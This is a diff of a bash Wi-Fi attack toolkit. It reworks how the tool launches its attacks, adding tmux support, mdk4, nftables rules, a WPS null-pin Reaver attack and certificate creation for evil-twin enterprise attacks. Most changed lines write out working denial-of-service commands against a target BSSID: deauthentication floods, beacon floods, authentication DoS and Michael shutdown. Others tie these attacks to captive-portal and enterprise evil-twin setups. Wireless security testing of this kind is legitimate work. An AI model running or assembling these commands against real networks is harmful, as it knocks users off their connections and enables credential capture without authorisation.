-			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1} (DoS Pursuit mode)" -e mdk3 "${interface_pursuit_mode_deauth}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
-		"Mdk3")
+		"${mdk_command}")
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
 			iwconfig "${interface_pursuit_mode_deauth}" channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 		"Wds Confusion")
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${secondary_wifi_interface}"
-			xterm +j -bg black -fg red -geometry "${deauth_scr_window_position}" -T "Deauth (DoS Pursuit mode)" -e "mdk3 ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" > /dev/null 2>&1 &
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
 		;;
 	esac
 
-	dos_pursuit_mode_attack_pid=$!
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		dos_pursuit_mode_attack_pid=$!
+	fi
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")
 
 	if [ "${channel}" -gt 14 ]; then
@@ -3439,6 +4124,20 @@ function launch_dos_pursuit_mode_attack() {
 	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
 	dos_pursuit_mode_scan_pid=$!
 	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
+
+	if [[ "${et_mode}" = "et_captive_portal" ]] || [[ -n "${enterprise_mode}" ]]; then
+
+		local processes_file
+		if [ "${et_mode}" = "et_captive_portal" ]; then
+			processes_file="${tmpdir}${webdir}${et_processesfile}"
+		elif [ -n "${enterprise_mode}" ]; then
+			processes_file="${tmpdir}${enterprisedir}${enterprise_processesfile}"
+		fi
+
+		for item in "${dos_pursuit_mode_pids[@]}"; do
+			echo "${item}" >> "${processes_file}"
+		done
+	fi
 }
 
 #Parse and control pids for DoS pursuit mode attack
@@ -3483,8 +4182,8 @@ pid_control_pursuit_mode() {
 	kill_dos_pursuit_mode_processes
 }
 
-#Execute mdk3 deauth DoS attack
-function exec_mdk3deauth() {
+#Execute mdk deauth DoS attack
+function exec_mdkdeauth() {
 
 	debug_print
 
@@ -3502,13 +4201,14 @@ function exec_mdk3deauth() {
 		language_strings "${language}" 4 "read"
 
 		dos_pursuit_mode_pids=()
-		launch_dos_pursuit_mode_attack "mdk3 amok attack" "first_time"
-		pid_control_pursuit_mode "mdk3 amok attack"
+		launch_dos_pursuit_mode_attack "${mdk_command} amok attack" "first_time"
+		pid_control_pursuit_mode "${mdk_command} amok attack"
 	else
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${mdk_command} amok attack\"" "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack" "active"
+		wait_for_process "${mdk_command} ${interface} d -b ${tmpdir}bl.txt -c ${channel}" "${mdk_command} amok attack"
 	fi
 }
 
@@ -3537,7 +4237,8 @@ function exec_aireplaydeauth() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"aireplay deauth attack\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack" "active"
+		wait_for_process "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}" "aireplay deauth attack"
 	fi
 }
 
@@ -3564,7 +4265,8 @@ function exec_wdsconfusion() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"wids / wips / wds confusion attack\"" "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack" "active"
+		wait_for_process "${mdk_command} ${interface} w -e ${essid} -c ${channel}" "wids / wips / wds confusion attack"
 	fi
 }
 
@@ -3591,7 +4293,8 @@ function exec_beaconflood() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"beacon flood attack\"" "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack" "active"
+		wait_for_process "${mdk_command} ${interface} b -n ${essid} -c ${channel} -s 1000 -h" "beacon flood attack"
 	fi
 }
 
@@ -3618,7 +4321,8 @@ function exec_authdos() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"auth dos attack\"" "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack" "active"
+		wait_for_process "${mdk_command} ${interface} a -a ${bssid} -m -s 1024" "auth dos attack"
 	fi
 }
 
@@ -3645,12 +4349,13 @@ function exec_michaelshutdown() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack" "active"
+		wait_for_process "${mdk_command} ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
 	fi
 }
 
-#Validate Mdk3 parameters
-function mdk3_deauth_option() {
+#Validate mdk parameters
+function mdk_deauth_option() {
 
 	debug_print
 
@@ -3681,7 +4386,42 @@ function mdk3_deauth_option() {
 		dos_pursuit_mode=1
 	fi
 
-	exec_mdk3deauth
+	exec_mdkdeauth
+}
+
+#Switch mdk version
+function mdk_version_toggle() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk3):\1=mdk4:" "${rc_path}" 2> /dev/null
+		AIRGEDDON_MDK_VERSION="mdk4"
+	else
+		sed -ri "s:(AIRGEDDON_MDK_VERSION)=(mdk4):\1=mdk3:" "${rc_path}" 2> /dev/null
+		AIRGEDDON_MDK_VERSION="mdk3"
+	fi
+
+	set_mdk_version
+}
+
+#Set mdk to selected version validating its existence
+function set_mdk_version() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		if ! hash mdk3 2> /dev/null; then
+			echo
+			language_strings "${language}" 636 "red"
+			exit_code=1
+			exit_script_option
+		else
+			mdk_command="mdk3"
+		fi
+	else
+		mdk_command="mdk4"
+	fi
 }
 
 #Validate Aireplay parameters
@@ -3892,7 +4632,7 @@ function wep_option() {
 	exec_wep_allinone_attack
 }
 
-#Validate wps parameters for custom pin, pixie dust, bruteforce and pin database attacks
+#Validate wps parameters for custom pin, pixie dust, bruteforce, pin database and null pin attacks
 function wps_attacks_parameters() {
 
 	debug_print
@@ -3927,6 +4667,9 @@ function wps_attacks_parameters() {
 				ask_timeout "wps_pixiedust"
 			;;
 			"pindb_bully"|"pindb_reaver")
+				ask_timeout "wps_standard"
+			;;
+			"nullpin_reaver")
 				ask_timeout "wps_standard"
 			;;
 		esac
@@ -3987,6 +4730,14 @@ function print_options() {
 	else
 		language_strings "${language}" 595 "blue"
 	fi
+
+	language_strings "${language}" 641 "blue"
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		language_strings "${language}" 618 "blue"
+	else
+		language_strings "${language}" 619 "blue"
+	fi
 }
 
 #Print selected interface
@@ -4014,7 +4765,7 @@ function print_iface_internet_selected() {
 
 	debug_print
 
-	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
+	if [ "${et_mode}" != "et_captive_portal" ]; then
 		if [ -z "${internet_interface}" ]; then
 			language_strings "${language}" 283 "blue"
 		else
@@ -4251,29 +5002,31 @@ function initialize_menu_options_dependencies() {
 
 	debug_print
 
-	clean_handshake_dependencies=(${optional_tools_names[0]})
-	aircrack_attacks_dependencies=(${optional_tools_names[1]})
-	aireplay_attack_dependencies=(${optional_tools_names[2]})
-	mdk3_attack_dependencies=(${optional_tools_names[3]})
-	hashcat_attacks_dependencies=(${optional_tools_names[4]})
-	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
-	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
-	et_sniffing_sslstrip_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]} ${optional_tools_names[10]})
-	et_captive_portal_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[11]})
-	wash_scan_dependencies=(${optional_tools_names[13]})
-	reaver_attacks_dependencies=(${optional_tools_names[14]})
-	bully_attacks_dependencies=(${optional_tools_names[15]} ${optional_tools_names[17]})
-	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]} ${optional_tools_names[17]})
-	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
-	et_sniffing_sslstrip2_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[18]} ${optional_tools_names[19]})
-	wep_attack_dependencies=(${optional_tools_names[2]} ${optional_tools_names[20]})
-	enterprise_attack_dependencies=(${optional_tools_names[21]} ${optional_tools_names[22]})
-	asleap_attacks_dependencies=(${optional_tools_names[22]})
-	john_attacks_dependencies=(${optional_tools_names[23]})
-	johncrunch_attacks_dependencies=(${optional_tools_names[23]} ${optional_tools_names[1]})
+	clean_handshake_dependencies=("${optional_tools_names[0]}")
+	aircrack_attacks_dependencies=("${optional_tools_names[1]}")
+	aireplay_attack_dependencies=("${optional_tools_names[2]}")
+	mdk_attack_dependencies=("${optional_tools_names[3]}")
+	hashcat_attacks_dependencies=("${optional_tools_names[4]}")
+	et_onlyap_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}")
+	et_sniffing_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}")
+	et_sniffing_sslstrip_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}" "${optional_tools_names[10]}")
+	et_captive_portal_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[11]}" "${optional_tools_names[12]}")
+	wash_scan_dependencies=("${optional_tools_names[13]}")
+	reaver_attacks_dependencies=("${optional_tools_names[14]}")
+	bully_attacks_dependencies=("${optional_tools_names[15]}")
+	bully_pixie_dust_attack_dependencies=("${optional_tools_names[15]}" "${optional_tools_names[16]}")
+	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[16]}")
+	et_sniffing_sslstrip2_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[17]}" "${optional_tools_names[18]}")
+	wep_attack_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[19]}")
+	enterprise_attack_dependencies=("${optional_tools_names[20]}" "${optional_tools_names[21]}" "${optional_tools_names[23]}")
+	asleap_attacks_dependencies=("${optional_tools_names[21]}")
+	john_attacks_dependencies=("${optional_tools_names[22]}")
+	johncrunch_attacks_dependencies=("${optional_tools_names[22]}" "${optional_tools_names[1]}")
+	enterprise_certificates_dependencies=("${optional_tools_names[23]}")
 }
 
 #Set possible changes for some commands that can be found in different ways depending of the O.S.
+#shellcheck disable=SC2206
 function set_possible_aliases() {
 
 	debug_print
@@ -4283,12 +5036,36 @@ function set_possible_aliases() {
 			arraliases=(${possible_alias_names[${item//[[:space:]]/ }]})
 			for item2 in "${arraliases[@]}"; do
 				if hash "${item2}" 2> /dev/null; then
-					optional_tools_names=(${optional_tools_names[@]/${item}/${item2}})
+					optional_tools_names=(${optional_tools_names[@]/${item}/"${item2}"})
 					break
 				fi
 			done
 		fi
 	done
+}
+
+#Modify dependencies arrays depending on selected options
+function dependencies_modifications() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		essential_tools_names=("${essential_tools_names[@]/xterm/tmux}")
+		possible_package_names[${essential_tools_names[7]}]="tmux"
+		unset possible_package_names["xterm"]
+	fi
+
+	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
+		optional_tools_names=("${optional_tools_names[@]/mdk4/mdk3}")
+		possible_package_names[${optional_tools_names[3]}]="mdk3"
+		unset possible_package_names["mdk4"]
+	fi
+
+	if [ "${iptables_nftables}" -eq 0 ]; then
+		optional_tools_names=("${optional_tools_names[@]/nft/iptables}")
+		possible_package_names[${optional_tools_names[7]}]="iptables"
+		unset possible_package_names["nftables"]
+	fi
 }
 
 #Initialize optional_tools values
@@ -4328,13 +5105,14 @@ function initialize_menu_and_print_selections() {
 		"handshake_tools_menu")
 			print_iface_selected
 			print_all_target_vars
+			return_to_handshake_tools_menu=0
 		;;
 		"dos_attacks_menu")
 			dos_pursuit_mode=0
 			print_iface_selected
 			print_all_target_vars
 		;;
-		"attack_handshake_menu")
+		"dos_handshake_menu")
 			print_iface_selected
 			print_all_target_vars
 		;;
@@ -4349,7 +5127,6 @@ function initialize_menu_and_print_selections() {
 			return_to_et_main_menu_from_beef=0
 			retrying_handshake_capture=0
 			internet_interface_selected=0
-			captive_portal_mode="internet"
 			et_mode=""
 			et_processes=()
 			secondary_wifi_interface=""
@@ -4410,7 +5187,7 @@ function clean_env_vars() {
 
 	debug_print
 
-	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE
+	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_MDK_VERSION AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE AIRGEDDON_WINDOWS_HANDLING
 }
 
 #Clean temporary files
@@ -4442,6 +5219,7 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
@@ -4467,42 +5245,78 @@ function clean_routing_rules() {
 		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward
 	fi
 
+	clean_initialize_iptables_nftables
+
 	if [ "${iptables_saved}" -eq 1 ]; then
-		restore_iptables
+		restore_iptables_nftables
+	fi
+
+	rm -rf "${tmpdir}${routing_tmp_file}" > /dev/null 2>&1
+}
+
+#Save iptables/nftables rules
+function save_iptables_nftables() {
+
+	debug_print
+
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		if hash "iptables-${iptables_cmd}-save" 2> /dev/null; then
+			if "iptables-${iptables_cmd}-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
+				iptables_saved=1
+			fi
+		elif hash "${iptables_cmd}-compat-save" 2> /dev/null; then
+			if "${iptables_cmd}-compat-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
+				iptables_saved=1
+			fi
+		fi
 	else
-		clean_iptables
-	fi
-
-	rm -rf "${tmpdir}ag.iptables" > /dev/null 2>&1
-}
-
-#Save iptables rules
-function save_iptables() {
-
-	debug_print
-
-	if "${iptables_cmd}-save" > "${tmpdir}ag.iptables" 2> /dev/null; then
-		iptables_saved=1
+		if hash "${iptables_cmd}-save" 2> /dev/null; then
+			if "${iptables_cmd}-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
+				iptables_saved=1
+			fi
+		fi
 	fi
 }
 
-#Restore iptables rules
-function restore_iptables() {
+#Restore iptables/nftables rules
+function restore_iptables_nftables() {
 
 	debug_print
 
-	"${iptables_cmd}-restore" < "${tmpdir}ag.iptables" 2> /dev/null
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		if hash "iptables-${iptables_cmd}-restore" 2> /dev/null; then
+			"iptables-${iptables_cmd}-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
+		elif hash "${iptables_cmd}-compat-restore" 2> /dev/null; then
+			"${iptables_cmd}-compat-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
+		fi
+	else
+		if hash "${iptables_cmd}-restore" 2> /dev/null; then
+			"${iptables_cmd}-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
+		fi
+	fi
 }
 
-#Clean iptables rules
-function clean_iptables() {
+#Clean and initialize iptables/nftables rules
+function clean_initialize_iptables_nftables() {
 
 	debug_print
 
-	"${iptables_cmd}" -F
-	"${iptables_cmd}" -t nat -F
-	"${iptables_cmd}" -X
-	"${iptables_cmd}" -t nat -X
+	if [ "${iptables_nftables}" -eq 1 ]; then
+		"${iptables_cmd}" add table ip filter 2> /dev/null
+		"${iptables_cmd}" add chain ip filter INPUT 2> /dev/null
+		"${iptables_cmd}" add chain ip filter OUTPUT 2> /dev/null
+		"${iptables_cmd}" add chain ip filter FORWARD 2> /dev/null
+		"${iptables_cmd}" flush table ip filter 2> /dev/null
+		"${iptables_cmd}" add table ip nat 2> /dev/null
+		"${iptables_cmd}" add chain nat PREROUTING "{ type nat hook prerouting priority 0 ; }" 2> /dev/null
+		"${iptables_cmd}" add chain nat POSTROUTING "{ type nat hook postrouting priority 100 ; }" 2> /dev/null
+		"${iptables_cmd}" flush table ip nat 2> /dev/null
+	else
+		"${iptables_cmd}" -F 2> /dev/null
+		"${iptables_cmd}" -t nat -F 2> /dev/null
+		"${iptables_cmd}" -X 2> /dev/null
+		"${iptables_cmd}" -t nat -X 2> /dev/null
+	fi
 }
 
 #Create an array from parameters
@@ -4557,12 +5371,12 @@ function print_hint() {
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[handshake_hints|${randomhint}]}
 		;;
-		"attack_handshake_menu")
-			store_array hints handshake_attack_hints "${handshake_attack_hints[@]}"
-			hintlength=${#handshake_attack_hints[@]}
+		"dos_handshake_menu")
+			store_array hints dos_handshake_hints "${dos_handshake_hints[@]}"
+			hintlength=${#dos_handshake_hints[@]}
 			((hintlength--))
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
-			strtoprint=${hints[handshake_attack_hints|${randomhint}]}
+			strtoprint=${hints[dos_handshake_hints|${randomhint}]}
 		;;
 		"decrypt_menu")
 			store_array hints decrypt_hints "${decrypt_hints[@]}"
@@ -4752,6 +5566,8 @@ function enterprise_attacks_menu() {
 	language_strings "${language}" 55
 	language_strings "${language}" 56
 	language_strings "${language}" 49
+	language_strings "${language}" 627 "separator"
+	language_strings "${language}" 628 enterprise_certificates_dependencies[@]
 	language_strings "${language}" 117 "separator"
 	language_strings "${language}" 260 enterprise_attack_dependencies[@]
 	language_strings "${language}" 248 "separator"
@@ -4776,19 +5592,9 @@ function enterprise_attacks_menu() {
 			explore_for_targets_option "WPA" "enterprise"
 		;;
 		5)
-			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
-				forbidden_menu_option
-			else
-				current_iface_on_messages="${interface}"
-				if check_interface_wifi "${interface}"; then
-					enterprise_mode="smooth"
-					et_dos_menu "enterprise"
-				else
-					echo
-					language_strings "${language}" 281 "red"
-					language_strings "${language}" 115 "read"
-				fi
-			fi
+			custom_certificates_questions
+			create_certificates_config_files
+			create_custom_certificates
 		;;
 		6)
 			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
@@ -4796,8 +5602,27 @@ function enterprise_attacks_menu() {
 			else
 				current_iface_on_messages="${interface}"
 				if check_interface_wifi "${interface}"; then
-					enterprise_mode="noisy"
-					et_dos_menu "enterprise"
+					if custom_certificates_integration; then
+						enterprise_mode="smooth"
+						et_dos_menu "enterprise"
+					fi
+				else
+					echo
+					language_strings "${language}" 281 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		7)
+			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				current_iface_on_messages="${interface}"
+				if check_interface_wifi "${interface}"; then
+					if custom_certificates_integration; then
+						enterprise_mode="noisy"
+						et_dos_menu "enterprise"
+					fi
 				else
 					echo
 					language_strings "${language}" 281 "red"
@@ -4955,8 +5780,8 @@ function beef_pre_menu() {
 	language_strings "${language}" 266
 	print_simple_separator
 
-	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
-		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
+	if [[ "${beef_found}" -eq 0 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
+		if [[ ${optional_tools[${optional_tools_names[5]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[6]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[7]}]} -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[17]}]} -eq 1 ]]; then
 			language_strings "${language}" 409 "warning"
 			language_strings "${language}" 416 "pink"
 		else
@@ -4998,7 +5823,7 @@ function beef_pre_menu() {
 			fi
 		;;
 		2)
-			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[19]}]} -eq 1 ]]; then
+			if [[ "${beef_found}" -eq 1 ]] && [[ ${optional_tools[${optional_tools_names[18]}]} -eq 1 ]]; then
 				echo
 				language_strings "${language}" 412 "red"
 				language_strings "${language}" 115 "read"
@@ -5040,6 +5865,7 @@ function wps_attacks_menu() {
 	language_strings "${language}" 359 reaver_attacks_dependencies[@]
 	language_strings "${language}" 348 bully_attacks_dependencies[@]
 	language_strings "${language}" 360 reaver_attacks_dependencies[@]
+	language_strings "${language}" 622 reaver_attacks_dependencies[@]
 	print_simple_separator
 	language_strings "${language}" 494
 	print_hint ${current_menu}
@@ -5221,6 +6047,27 @@ function wps_attacks_menu() {
 			fi
 		;;
 		13)
+			if contains_element "${wps_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				wps_attack="nullpin_reaver"
+				get_reaver_version
+				if validate_reaver_nullpin_version; then
+					echo
+					language_strings "${language}" 623 "yellow"
+					language_strings "${language}" 115 "read"
+					if wps_attacks_parameters; then
+						manage_wps_log
+						exec_reaver_nullpin_attack
+					fi
+				else
+					echo
+					language_strings "${language}" 624 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
+		;;
+		14)
 			offline_pin_generation_menu
 		;;
 		*)
@@ -6182,7 +7029,7 @@ function hashcat_bruteforce_attack_option() {
 	set_minlength_and_maxlength "${1}"
 
 	charset_option=0
-	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 5 )); do
+	while [[ ! ${charset_option} =~ ^[[:digit:]]+$ ]] || (( charset_option < 1 || charset_option > 11 )); do
 		set_charset "hashcat"
 	done
 
@@ -6700,6 +7547,44 @@ function manage_enterprise_log() {
 	done
 }
 
+#Check to save certs for Evil Twin Enterprise attack
+function manage_enterprise_certs() {
+
+	debug_print
+
+	enterprisecertspath=$(env | grep ^HOME | awk -F = '{print $2}')
+
+	lastcharenterprisecertspath=${enterprisecertspath: -1}
+	if [ "${lastcharenterprisecertspath}" != "/" ]; then
+		enterprisecertspath="${enterprisecertspath}/"
+	fi
+	enterprisecerts_suggested_dirname="enterprise_certs"
+	enterprisecertspath="${enterprisecertspath}${enterprisecerts_suggested_dirname}/"
+
+	validpath=1
+	while [[ "${validpath}" != "0" ]]; do
+		read_path "certificates"
+	done
+}
+
+#Save created cert files to user's location
+function save_enterprise_certs() {
+
+	debug_print
+
+	if [ ! -d "${enterprisecerts_completepath}" ]; then
+		mkdir -p "${enterprisecerts_completepath}" > /dev/null 2>&1
+	fi
+
+	cp "${tmpdir}${certsdir}server.pem" "${enterprisecerts_completepath}" 2> /dev/null
+	cp "${tmpdir}${certsdir}ca.pem" "${enterprisecerts_completepath}" 2> /dev/null
+	cp "${tmpdir}${certsdir}server.key" "${enterprisecerts_completepath}" 2> /dev/null
+
+	echo
+	language_strings "${language}" 644 "blue"
